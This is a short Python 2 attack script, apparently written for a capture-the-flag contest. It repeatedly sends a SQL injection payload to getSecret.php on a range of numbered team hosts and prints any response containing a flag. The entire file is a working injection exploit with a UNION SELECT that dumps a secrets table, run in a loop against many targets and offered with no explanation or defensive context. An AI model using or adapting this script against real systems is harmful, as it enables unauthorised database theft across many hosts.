import urllib
import urllib2
import sys

thing = 'http://ctfteam'
thing2 = '.mit.edu/getSecret.php'

while thing != '1':
    for x in range(1, 39):
        try:
            url = thing + str(x) + thing2
            values = {'user' : "' AND 0=1 UNION SELECT string_agg(secret, ',') FROM secret_share GROUP BY 0=0--", 'passwd' : '', 'flag' : ''}
            data = urllib.urlencode(values)
            req = urllib2.Request(url, data)
            response = urllib2.urlopen(req)
            the_page = response.read()
            if 'flag' in the_page and 'youtube' not in the_page:
                print the_page
        except:
            print sys.exc_info()[0], x
            continue
            
 
